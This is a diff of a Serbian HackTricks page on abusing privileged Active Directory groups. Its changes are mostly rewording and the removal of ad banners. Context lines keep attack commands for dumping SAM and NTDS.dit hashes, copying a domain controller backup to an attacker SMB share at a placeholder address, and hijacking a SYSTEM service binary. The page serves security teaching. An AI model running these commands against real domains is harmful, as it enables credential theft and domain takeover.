@@ -2,18 +2,11 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-<figure><img src="/images/image (48).png" alt=""><figcaption></figcaption></figure>
-
-Koristite [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection) za lako kreiranje i **automatizaciju radnih tokova** pokretanih **najnaprednijim** alatima zajednice na svetu.\
-Pribavite pristup danas:
-
-{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}
-
-## Poznate grupe sa administratorskim privilegijama
+## Pažnje poznate grupe sa administratorskim privilegijama
 
 - **Administratori**
-- **Domain Admins**
-- **Enterprise Admins**
+- **Administratori domena**
+- **Administratori preduzeća**
 
 ## Operatori naloga
 
@@ -29,7 +22,7 @@ Dodavanje novih korisnika je dozvoljeno, kao i lokalna prijava na DC01.
 
 Access Control List (ACL) grupe **AdminSDHolder** je ključna jer postavlja dozvole za sve "zaštićene grupe" unutar Active Directory, uključujući grupe sa visokim privilegijama. Ovaj mehanizam osigurava bezbednost ovih grupa sprečavanjem neovlašćenih izmena.
 
-Napadač bi mogao da iskoristi ovo modifikovanjem ACL-a grupe **AdminSDHolder**, dodeljujući pune dozvole standardnom korisniku. Ovo bi efikasno dalo tom korisniku punu kontrolu nad svim zaštićenim grupama. Ako se dozvole ovog korisnika promene ili uklone, one bi se automatski vratile u roku od sat vremena zbog dizajna sistema.
+Napadač bi mogao da iskoristi ovo modifikovanjem ACL-a grupe **AdminSDHolder**, dodeljujući pune dozvole standardnom korisniku. Ovo bi efikasno dalo tom korisniku punu kontrolu nad svim zaštićenim grupama. Ako se dozvole ovog korisnika promene ili uklone, one bi se automatski ponovo uspostavile u roku od sat vremena zbog dizajna sistema.
 
 Komande za pregled članova i modifikaciju dozvola uključuju:
 ```powershell
@@ -43,11 +36,11 @@ Za više detalja, posetite [ired.team](https://ired.team/offensive-security-expe
 
 ## AD Recycle Bin
 
-Članstvo u ovoj grupi omogućava čitanje obrisanih objekata Active Directory-a, što može otkriti osetljive informacije:
+Članstvo u ovoj grupi omogućava čitanje obrisanih Active Directory objekata, što može otkriti osetljive informacije:
 ```bash
 Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
 ```
-### Pristup Kontroleru Domen
+### Pristup Domenskom Kontroleru
 
 Pristup datotekama na DC-u je ograničen osim ako korisnik nije deo grupe `Server Operators`, što menja nivo pristupa.
 
@@ -61,9 +54,9 @@ Ova komanda otkriva da `Server Operators` imaju potpuni pristup, omogućavajući
 
 ## Backup Operators
 
-Članstvo u grupi `Backup Operators` pruža pristup `DC01` datotečnom sistemu zbog privilegija `SeBackup` i `SeRestore`. Ove privilegije omogućavaju pretraživanje foldera, listanje i kopiranje datoteka, čak i bez eksplicitnih dozvola, koristeći `FILE_FLAG_BACKUP_SEMANTICS` flag. Korišćenje specifičnih skripti je neophodno za ovaj proces.
+Članstvo u grupi `Backup Operators` pruža pristup `DC01` fajl sistemu zbog privilegija `SeBackup` i `SeRestore`. Ove privilegije omogućavaju pretragu foldera, listanje i kopiranje fajlova, čak i bez eksplicitnih dozvola, koristeći `FILE_FLAG_BACKUP_SEMANTICS` flag. Korišćenje specifičnih skripti je neophodno za ovaj proces.
 
-Da biste naveli članove grupe, izvršite:
+Da biste listali članove grupe, izvršite:
 ```powershell
 Get-NetGroupMember -Identity "Backup Operators" -Recurse
 ```
@@ -122,9 +115,9 @@ reg save HKLM\SAM SAM.SAV
 ```shell-session
 secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
 ```
-#### Korišćenje wbadmin.exe
+#### Koristeći wbadmin.exe
 
-1. Postavite NTFS fajl sistem za SMB server na mašini napadača i keširajte SMB akreditive na cilјnoj mašini.
+1. Postavite NTFS datotečni sistem za SMB server na mašini napadača i keširajte SMB akreditive na cilјnoj mašini.
 2. Koristite `wbadmin.exe` za sistemsku rezervnu kopiju i ekstrakciju `NTDS.dit`:
 ```cmd
 net use X: \\<AttackIP>\sharename /user:smbuser password
@@ -170,7 +163,7 @@ Ponovno pokretanje DNS usluge (što može zahtevati dodatne dozvole) je neophodn
 sc.exe \\dc01 stop dns
 sc.exe \\dc01 start dns
 ```
-Za više detalja o ovom napadnom vektoru, pogledajte ired.team.
+Za više detalja o ovom napadu, pogledajte ired.team.
 
 #### Mimilib.dll
 
@@ -178,10 +171,10 @@ Takođe je moguće koristiti mimilib.dll za izvršavanje komandi, modifikujući 
 
 ### WPAD zapis za MitM
 
-DnsAdmins mogu manipulisati DNS zapisima da bi izveli napade Man-in-the-Middle (MitM) kreiranjem WPAD zapisa nakon onemogućavanja globalne liste blokiranih upita. Alati poput Responder ili Inveigh mogu se koristiti za spoofing i hvatanje mrežnog saobraćaja.
+DnsAdmins mogu manipulisati DNS zapisima da bi izveli Man-in-the-Middle (MitM) napade kreiranjem WPAD zapisa nakon onemogućavanja globalne liste blokiranja upita. Alati poput Responder ili Inveigh mogu se koristiti za spoofing i hvatanje mrežnog saobraćaja.
 
 ### Čitaoci događaja
-Članovi mogu pristupiti zapisima događaja, potencijalno pronalazeći osetljive informacije kao što su lozinke u običnom tekstu ili detalji izvršavanja komandi:
+Članovi mogu pristupiti dnevnicima događaja, potencijalno pronalazeći osetljive informacije kao što su lozinke u običnom tekstu ili detalji izvršavanja komandi:
 ```powershell
 # Get members and search logs for sensitive information
 Get-NetGroupMember -Identity "Event Log Readers" -Recurse
@@ -196,11 +189,11 @@ Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
 ```
 ## Hyper-V Administratori
 
-Hyper-V Administratori imaju potpuni pristup Hyper-V, što se može iskoristiti za preuzimanje kontrole nad virtuelizovanim Domen kontrolerima. To uključuje kloniranje aktivnih DC-ova i vađenje NTLM hash-eva iz NTDS.dit datoteke.
+Hyper-V Administratori imaju potpuni pristup Hyper-V, što se može iskoristiti za preuzimanje kontrole nad virtuelizovanim Domen kontrolerima. Ovo uključuje kloniranje aktivnih DC-ova i vađenje NTLM hash-eva iz NTDS.dit datoteke.
 
 ### Primer Iskorišćavanja
 
-Mozilla Maintenance Service u Firefox-u može biti iskorišćen od strane Hyper-V Administratora za izvršavanje komandi kao SYSTEM. To uključuje kreiranje hard linka do zaštićene SYSTEM datoteke i zamenu sa malicioznim izvršnim fajlom:
+Mozilla Maintenance Service u Firefox-u može biti iskorišćen od strane Hyper-V Administratora za izvršavanje komandi kao SYSTEM. Ovo uključuje kreiranje hard linka do zaštićene SYSTEM datoteke i zamenu sa malicioznim izvršnim fajlom:
 ```bash
 # Take ownership and start the service
 takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
@@ -244,7 +237,7 @@ Za tehnike eksploatacije vezane za **WinRM**, treba konsultovati specifičnu dok
 
 #### Server Operators
 
-Ova grupa ima dozvole za izvođenje raznih konfiguracija na kontrolerima domena, uključujući privilegije za pravljenje rezervnih kopija i vraćanje, promenu sistemskog vremena i isključivanje sistema. Da biste nabrojali članove, komanda koja se koristi je:
+Ova grupa ima dozvole za izvođenje raznih konfiguracija na domen kontrolerima, uključujući privilegije za pravljenje rezervnih kopija i vraćanje, promenu sistemskog vremena i isključivanje sistema. Da biste nabrojali članove, komanda koja se koristi je:
 ```powershell
 Get-NetGroupMember -Identity "Server Operators" -Recurse
 ```
@@ -265,11 +258,5 @@ Get-NetGroupMember -Identity "Server Operators" -Recurse
 - [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
 - [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
 
-<figure><img src="/images/image (48).png" alt=""><figcaption></figcaption></figure>
-
-Koristite [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection) za lako kreiranje i **automatizaciju radnih tokova** pokretanih **najnaprednijim** alatima zajednice na svetu.\
-Pribavite pristup danas:
-
-{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}
 
 {{#include ../../banners/hacktricks-training.md}}
